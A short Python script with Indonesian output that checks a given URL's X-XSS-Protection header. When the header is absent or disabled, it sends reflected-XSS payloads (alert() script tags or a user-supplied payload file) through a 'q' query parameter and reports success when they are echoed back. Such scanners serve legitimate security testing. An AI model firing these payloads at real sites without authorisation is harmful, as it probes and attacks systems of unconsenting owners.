import requests
import sys
from urllib.parse import urlparse
from collections import Counter

def check_xss_protection(url):
    try:
        response = requests.get(url)
        xss_protection = response.headers.get("X-XSS-Protection")

        if xss_protection is None:
            print("\033[93mPeringatan: Header X-XSS-Protection tidak ada.\033[0m")
            print("Situs mungkin rentan terhadap serangan Reflected XSS pada browser lama.")
            print("Versi Google Chrome yang rentan: Sebelum versi 49")
            return False, None
        elif xss_protection == "0":
            print("\033[93mPeringatan: Header X-XSS-Protection dinonaktifkan.\033[0m")
            print("Situs mungkin rentan terhadap serangan Reflected XSS.")
            return False, xss_protection
        else:
            print(f"\033[92mHeader X-XSS-Protection ditemukan: {xss_protection}\033[0m")
            return True, xss_protection

    except requests.exceptions.RequestException as e:
        print(f"\033[91mKesalahan: {e}\033[0m")
        return None, None

def exploit_reflected_xss(url, payload):
    try:
        response = requests.get(url, params={"q": payload})
        if payload in response.text:
            print(f"\033[91mKerentanan Reflected XSS berhasil dieksploitasi!\033[0m")
            print(f"Payload: {payload}")
            print(f"Respons: {response.text[:200]}...")  # Tampilkan sebagian respons untuk PoC
            return True
        else:
            print("\033[92mPayload XSS tidak berhasil dieksekusi.\033[0m")
            return False
    except requests.exceptions.RequestException as e:
        print(f"\033[91mKesalahan: {e}\033[0m")
        return False

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print("Penggunaan: python3 xss_protection_check.py <url> <file_payload (opsional)>")
        return

    url = sys.argv[1]
    payload_file = sys.argv[2] if len(sys.argv) == 3 else None

    has_xss_protection, _ = check_xss_protection(url)

    if not has_xss_protection:
        if payload_file:
            with open(payload_file, "r") as f:
                payloads = [line.strip() for line in f]
        else:
            payloads = [
                "<script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
            ]
        for payload in payloads:
            if exploit_reflected_xss(url, payload):
                break  

if __name__ == "__main__":
    main()
